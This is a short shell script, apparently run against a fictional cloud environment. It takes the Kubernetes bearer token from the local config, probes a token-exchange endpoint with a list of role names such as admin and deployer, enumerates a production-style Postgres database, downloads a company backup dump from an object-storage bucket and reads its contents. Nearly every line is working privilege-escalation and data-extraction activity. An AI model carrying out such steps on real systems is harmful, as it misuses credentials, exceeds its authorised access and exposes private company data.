set +e
B=https://cloud-api.keplerops.test
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
echo "== token-exchange role probing with JWT =="
for r in rowan-workspace workspace fieldlink reader viewer workload workloads default admin record-reader records exports support cloud-reader report-runner runner deployer; do
  out=$(curl -sSk -m 6 -o /tmp/te -w '%{http_code}' -X POST -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' -d '{}' "$B/api/token-exchange/$r")
  echo "-- $r -> $out $(head -c 200 /tmp/te)"
done
echo "== psql =="
which psql; psql service=fieldlink -c '\dn' 2>&1 | head -20
psql service=fieldlink -c '\dt *.*' 2>&1 | head -60
echo "== download dump =="
cd /tmp && aws --endpoint-url https://objects.keplerops.test s3 cp s3://fieldlink-exports/backups/company-history.dump /tmp/ch.dump 2>&1
ls -la /tmp/ch.dump; file /tmp/ch.dump; head -c 600 /tmp/ch.dump; echo
echo "== strings dump =="
strings /tmp/ch.dump | head -80
